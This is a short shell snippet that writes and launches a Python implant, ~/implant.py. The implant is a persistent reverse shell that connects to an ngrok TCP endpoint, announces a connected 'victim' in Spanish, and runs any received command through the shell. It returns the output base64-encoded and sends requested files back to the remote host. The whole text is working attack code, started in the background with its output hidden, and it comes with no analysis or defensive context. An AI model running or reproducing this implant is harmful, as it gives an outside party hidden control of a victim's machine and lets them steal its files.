
nohup python3 ~/implant.py &>/dev/null &


cat > ~/implant.py << 'EOF'
#!/usr/bin/env python3
import socket, subprocess, time, os, base64, json
while True:
    try:
        s = socket.socket()
        s.connect(("6.tcp.eu.ngrok.io", 12843))
        s.send(b"[+] VICTIMA CONECTADA\n")
        while True:
            cmd = ""
            while not cmd.endswith("\n"):
                data = s.recv(1024).decode(errors="ignore")
                if not data: raise
                cmd += data
            cmd = cmd.strip()
            if cmd in ["exit","quit"]: break
            if cmd.startswith("get "):
                file = cmd[4:].strip()
                if os.path.exists(file) and os.path.getsize(file) < 5*1024*1024:
                    s.send(b"FILE_START\n")
                    with open(file,"rb") as f:
                        while c:=f.read(8192): s.send(c)
                    s.send(b"\nFILE_END")
                else: s.send(b"[-] Archivo no existe o muy grande\n")
            else:
                r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
                out = r.stdout + r.stderr
                if not out: out = "[ok]"
                s.send(json.dumps({"data": base64.b64encode(out.encode()).decode()}).encode() + b"\n")
        s.close()
    except:
        time.sleep(10)
EOF
